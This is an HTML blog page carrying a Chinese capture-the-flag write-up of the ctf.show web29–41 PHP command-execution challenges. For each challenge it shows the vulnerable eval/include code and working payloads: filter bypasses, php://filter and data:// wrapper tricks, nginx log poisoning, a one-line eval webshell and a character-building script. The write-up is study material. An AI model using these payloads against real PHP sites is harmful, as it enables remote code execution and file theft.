@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web29-41命令执行篇（一）</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/03/15 22:12:49</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>很简单的一道题。<code>?c=system(&quot;ls&quot;);</code>查看一下发现flag.php就在当前目录下，因为过滤了flag字节，所以直接用f*代替就行<br>payload：<code>?c=system(&quot;cat f*&quot;);</code><br>flag在源代码中。</p>
+<h2 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h2><ul>
+<li>除此之外，我们可以将文件复制一份修改为其他名字。</li>
+</ul>
+<p>payload：<code>?c=system(&quot;cp f* a.txt&quot;);</code><br>然后直接访问或者cat访问都可以获得flag。</p>
+<ul>
+<li><p>或者使用<code>tac</code>从后往前输出内容<br><code>c=system(&quot;tac f*&quot;);</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678683262006-674f9d23-a923-4232-b54e-03a16b60eacc.png" alt="image.png"></p>
+</li>
+<li><p>除了使用system函数执行，也可以使用内敛执行：<code>echo </code>命令<code> 比如`c=echo `tac f*</code></p>
+</li>
+<li><p>看了wp发现还有几种解法比如：利用参数输入+eval&#x2F;include</p>
+<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(&quot;ls%20&#x2F;&quot;);
+
+?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
+</li>
+<li><p>或者上传木马：<code>file_put_contents(&quot;alb34t.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;cmd&quot;]);%20?&gt;%27);</code></p>
+</li>
+<li><p>hint中使用了另一种命令和绕过：<code>nl fl&#39;&#39;ag.php</code></p>
+</li>
+</ul>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>cat打开后php文件不会显示在页面上，因此需要f12查看源代码。</p>
+<h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>upload：<code>?c=echo </code>tac f*<code>;</code></p>
+<h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>空格过滤常用以下方法绕过：</p>
+<pre class="language-php" data-language="php"><code class="language-php">cat flag.txt
+cat$&#123;IFS&#125;flag.txt
+cat$IFS$9flag.txt &#x2F;&#x2F;9改成其他数字也行
+cat&lt;flag.txt
+cat&lt;&gt;flag.txt
+&#123;cat,flag.txt&#125;
+cat%09flag.txt
+cat%20flag.txt &#x2F;&#x2F;这个这里好像不行</code></pre>
+<p>payload：<code>?c=echo%09</code>tac%09f*<code>;</code></p>
+<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678685067177-79d4d744-a673-436a-ac56-1be9a06a0803.png" alt="image.png"></p>
+<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://ctf.show/writeups/865962">https://ctf.show/writeups/865962</a></p>
+</blockquote>
+<p>初次之外，wp中还有一种在log中注入木马的方式。在User-Agent<br>中写入木马<code>&lt;?php phpinfo();?&gt;</code>，在c中传入能正常访问的值，我们根据请求头可以判断出是nginx服务器，服务器的默认日志地址为：<code>/var/log/nginx/access.log </code>，再加上这里的include的字段，我们可以得到以下payload：<code>?c=include$_GET[a]?%3E&amp;a=../../../../var/log/nginx/access.log</code>，日志页面中出现phpinfo()页面，插入木马成功。</p>
+<h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\&quot;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;|\&lt;|\&#x3D;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>upload：<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;|\&lt;|\&#x3D;|\&#x2F;|[0-9]&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>过滤了数字，把1改为a就能接着用。<br>upload：<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h1 id="web37-data伪协议文件名base64"><a href="#web37-data伪协议文件名base64" class="headerlink" title="web37 data伪协议文件名base64"></a>web37 data伪协议文件名base64</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
+        include($c);
+        echo $flag;
+    
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>这回直接给你include，文件包含，不让出现flag字段，上来先想到data伪协议。<br>upload：<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code><br>其中<code>PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code>是：<code>&lt;?php system(&quot;tac flag.php&quot;);&gt;</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678719387328-7c2f4056-1b4c-4999-9290-945a41c4ce13.png" alt="image.png"></p>
+<h2 id="复习一下data伪协议的用法："><a href="#复习一下data伪协议的用法：" class="headerlink" title="复习一下data伪协议的用法："></a>复习一下data伪协议的用法：</h2><pre class="language-php" data-language="php"><code class="language-php">1、data:&#x2F;&#x2F;text&#x2F;plain,
+http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20phpinfo();?&gt;
+ 
+2、data:&#x2F;&#x2F;text&#x2F;plain;base64,
+http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre>
+<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123;
+        include($c);
+        echo $flag;
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>继续使用上一题upload即可：<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code></p>
+<h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
+        include($c.&quot;.php&quot;);
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<p>upload：<code>?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt;//</code><br>题目在include后面强加了<code>.php</code>我们只需要在语句中添加<code>//</code>注释掉末尾的字段即可。<br>但事实上，这道题不用管也可以，去掉<code>//</code>也是没问题的：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678720477364-6e7e2ec6-9a53-45d0-9550-05fa59a7a617.png" alt="image.png"></p>
+<h1 id="web40-禁止套娃（有·东西）"><a href="#web40-禁止套娃（有·东西）" class="headerlink" title="web40 禁止套娃（有·东西）"></a>web40 禁止套娃（有·东西）</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;</code></pre>
+<h2 id="fuzz查看pregmatch剩余字符"><a href="#fuzz查看pregmatch剩余字符" class="headerlink" title="fuzz查看pregmatch剩余字符"></a>fuzz查看pregmatch剩余字符</h2><p>先fuzz一下剩下了哪些常用字符：（他看着过滤了括号，但实际上是中文里的括号。。。）</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+  for($i &#x3D; 33; $i &lt;&#x3D; 126; $i++)&#123;
+  	if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, chr($i)))&#123;
+  	echo chr($i);
+  	&#125;
+  &#125;
+?&gt;</code></pre>
+
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678722206004-f1d59aca-48dc-4732-a094-8bd2ad896196.png" alt="image.png"><br>看到结果思考了半天没有想法，看了看wp学到了新姿势：</p>
+<h2 id="套娃解法"><a href="#套娃解法" class="headerlink" title="套娃解法"></a>套娃解法</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://ctf.show/writeups/1002659">https://ctf.show/writeups/1002659</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46250265/article/details/114266578">https://blog.csdn.net/weixin_46250265&#x2F;article&#x2F;details&#x2F;114266578</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aninock/p/15125215.html">https://www.cnblogs.com/aninock/p/15125215.html</a></p>
+</blockquote>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>来自题目下方的hint：<br>upload：<code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code><br>分析一下是什么意思，先解释一下其中的各个函数都是什么意思。</p>
+<pre class="language-php" data-language="php"><code class="language-php">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)
+scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件
+pos()：返回数组中的当前元素的值。
+array_reverse()：数组逆序
+next()： 函数将内部指针指向数组中的下一个元素，并输出。
+highlight_file()：函数进行文件内容的读取，并输出</code></pre>
+<p>var_dump一下localeconv()函数，第一个对应的值是<code>.</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678802966279-4fce3e4a-9652-4050-96bb-eabf4309afed.png" alt="image.png"><br>构造payload。首先是我们要输出列表下的所有文件：<br><code>print_r(scandir(&#39;.&#39;));</code>但是其中的点和单引号已经被过滤掉了，因此我们需要绕过一下，这就需要用到上面这个函数了（通过函数传参来获得）。所以想使用<code>localeconv()[&quot;decimal_point&quot;]</code>来获取到<code>.</code>但是双引号已经被过滤了。<br>这里有三个函数能够起到替代作用。</p>
+<pre class="language-php" data-language="php"><code class="language-php">current() 函数返回数组中的当前元素（单元）,默认取第一个值，
+pos() 同 current() ,是current()的别名
+reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE</code></pre>
+<p>测试一下：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803619659-b2d38fe5-349a-4625-bcc9-161167344e25.png" alt="image.png"><br>这时候payload已经初具规模了。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803689999-21e077e8-fcb2-43d7-a167-5d2f3d2a74e4.png" alt="image.png"><br>所以我们可以利用这段payload获取到当前文件夹的信息：<br><code>?c=var_dump(scandir(pos(localeconv())));</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803871260-e3107088-3440-4dc7-a3ff-5ab5057ee454.png" alt="image.png"><br><em>当然这次是flag文件就在当前文件夹，如果不在当前文件夹需要使用：</em><code>_var_dump(scandir(&#39;../../&#39;));_</code><br>接下来的思路就是想办法获取到文件。我们可以使用<code>highlight_file()</code>函数（或者使用<code>show_source()</code>）来查看文件。然后就是索引，我们可以使用next、end函数等，以下为相关的方法。</p>
+<pre class="language-php" data-language="php"><code class="language-php">current()返回数组中的当前元素的值。
+
+end()将内部指针指向数组中的最后一个元素，并输出。
+
+next()将内部指针指向数组中的下一个元素，并输出。
+
+prev()将内部指针指向数组中的上一个元素，并输出。
+
+reset()将内部指针指向数组中的第一个元素，并输出。
+
+each()返回当前元素的键名和键值，并将内部指针向前移动。</code></pre>
+<p>但是flag文件不在头尾，所以我们可以使用array_reverse函数来倒转然后通过<code>next</code>函数来获取到文件。<br>至此payload就可以构建了：<code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p>
+<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>当然不可能只有这几个函数恰好能够满足条件。<br>比如说其中的pos函数可以被current、reset函数替换。<br>show_resource函数可以使用high_light函数来替换。<br>pos（localeconv（））的组合函数也可以被getcwd函数替换掉。（getcwd函数会返回当前所在文件夹）。</p>
+<h3 id="方法二利用sessionid（好像不行）"><a href="#方法二利用sessionid（好像不行）" class="headerlink" title="方法二利用sessionid（好像不行）"></a>方法二利用sessionid（好像不行）</h3><p>利用sessionid来传参，但似乎传参也会被过滤，所以对这道题来说好像不太行…<br>upload：<code>?c=session_start();system(session_id());</code>，cookie修改为：<code>PHPSESSID=ls</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678806594280-0004a365-cdbd-46cd-b8b1-7691d0441e58.png" alt="image.png"></p>
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>首先是payload：<code>?c=eval(array_pop(next(get_defined_vars())));</code>除此之外需要用post传入<code>1=system(&#39;tac fl*&#39;);</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807377877-48a49a97-d692-427b-b685-6132ebc2fd30.png" alt="image.png"><br>分析，先讲述一下各个函数的作用：</p>
+<pre class="language-php" data-language="php"><code class="language-php">get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。
+
+next()将内部指针指向数组中的下一个元素，并输出。
+
+array_pop() 函数删除数组中的最后一个元素并返回其值。 </code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807006608-006af0ef-a25d-4623-bfb9-bcb58b1c5b0b.png" alt="image.png"><br>payload的含义就是在post中寻找到对应木马，并运行。、</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题真的有点东西，思路简单容易理解，但是难在如何找到返回这些需要参数的函数。</p>
+<h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;c&#39;]))&#123;
+    $c &#x3D; $_POST[&#39;c&#39;];
+if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;
+        eval(&quot;echo($c);&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;</code></pre>
+<p>查看一下剩余字符：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678884677705-956c818c-49fd-4272-8ebf-a47e532af942.png" alt="image.png"><br>把字符都过滤掉了，觉得应该是用什么方法来替代字符，但是之后就没有思路了。</p>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p>
+</blockquote>
+<p>看了wp，发现想法没问题。<br>题目中特意提到了，上来先考虑的是：<strong>异或自增和取反</strong>构造字符都无法使用，但是留下了<code>|</code><br>wp提供了两个脚本：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$myfile &#x3D; fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);
+$contents&#x3D;&quot;&quot;;
+for ($i&#x3D;0; $i &lt; 256; $i++) &#123; 
+    for ($j&#x3D;0; $j &lt;256 ; $j++) &#123; 
+
+    if($i&lt;16)&#123;
+$hex_i&#x3D;&#39;0&#39;.dechex($i);
+&#125;
+else&#123;
+    $hex_i&#x3D;dechex($i);
+&#125;
+if($j&lt;16)&#123;
+    $hex_j&#x3D;&#39;0&#39;.dechex($j);
+&#125;
+else&#123;
+    $hex_j&#x3D;dechex($j);
+&#125;
+$preg &#x3D; &#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;;
+if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
+    echo &quot;&quot;;
+&#125;
+
+else&#123;
+    $a&#x3D;&#39;%&#39;.$hex_i;
+$b&#x3D;&#39;%&#39;.$hex_j;
+$c&#x3D;(urldecode($a)|urldecode($b));
+if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;
+    $contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
+		&#125;
+	&#125;
+
+&#125;
+&#125;
+fwrite($myfile,$contents);
+fclose($myfile);</code></pre>
+<p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。</p>
